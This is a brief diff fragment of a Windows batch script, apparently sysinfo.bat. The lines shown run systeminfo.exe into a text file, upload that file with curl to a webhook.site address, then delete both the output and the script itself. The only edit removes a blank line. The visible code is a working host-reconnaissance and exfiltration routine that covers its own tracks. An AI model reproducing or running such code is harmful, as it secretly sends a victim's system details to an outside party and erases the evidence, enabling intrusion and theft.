@@ -15,5 +15,4 @@ systeminfo.exe >> info.txt
 curl https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513 -F SystemInfo=@info.txt
 del info.txt
 del sysinfo.bat
-
 exit
